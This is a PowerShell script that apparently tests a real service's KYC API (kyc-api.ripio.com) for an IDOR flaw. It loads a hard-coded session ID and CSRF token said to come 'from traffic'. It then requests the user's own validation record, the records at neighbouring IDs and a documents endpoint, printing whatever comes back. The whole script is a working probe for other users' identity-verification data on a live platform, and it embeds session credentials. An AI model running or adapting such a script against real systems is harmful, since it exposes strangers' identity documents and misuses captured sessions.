# Test KYC IDOR with session cookies from traffic
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie1 = New-Object System.Net.Cookie("sessionid", "bklle8gup6ivkxopqoo7vhlkozmxcl8h", "/", ".ripio.com")
$cookie2 = New-Object System.Net.Cookie("csrftoken", "iUdTREJfgGZNRlcoRlidVkSC2f8RZwQY3B8RCdU65sQSfzniL0FzPvQJNHuiEjrV", "/", ".ripio.com")
$session.Cookies.Add($cookie1)
$session.Cookies.Add($cookie2)

$baseId = 3418360

# Test current user's validation
Write-Host "=== Testing own validation ID: $baseId ===" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://kyc-api.ripio.com/api/v2/validations/$baseId/" -WebSession $session -Method GET
    Write-Host "SUCCESS:" -ForegroundColor Green
    $response | ConvertTo-Json -Depth 3
} catch {
    Write-Host "Error: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
}

# Test IDOR - previous user's validation
$targetId = $baseId - 1
Write-Host "`n=== Testing IDOR with ID: $targetId ===" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://kyc-api.ripio.com/api/v2/validations/$targetId/" -WebSession $session -Method GET
    Write-Host "IDOR FOUND!" -ForegroundColor Red
    $response | ConvertTo-Json -Depth 3
} catch {
    Write-Host "Error: $($_.Exception.Response.StatusCode.value__) - Protected" -ForegroundColor Green
}

# Test IDOR - next user's validation  
$targetId = $baseId + 1
Write-Host "`n=== Testing IDOR with ID: $targetId ===" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://kyc-api.ripio.com/api/v2/validations/$targetId/" -WebSession $session -Method GET
    Write-Host "IDOR FOUND!" -ForegroundColor Red
    $response | ConvertTo-Json -Depth 3
} catch {
    Write-Host "Error: $($_.Exception.Response.StatusCode.value__) - Protected" -ForegroundColor Green
}

# Test documents endpoint
Write-Host "`n=== Testing documents for ID: $baseId ===" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://kyc-api.ripio.com/api/v2/validations/$baseId/documents/" -WebSession $session -Method GET
    Write-Host "SUCCESS:" -ForegroundColor Green
    $response | ConvertTo-Json -Depth 3
} catch {
    Write-Host "Error: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
}
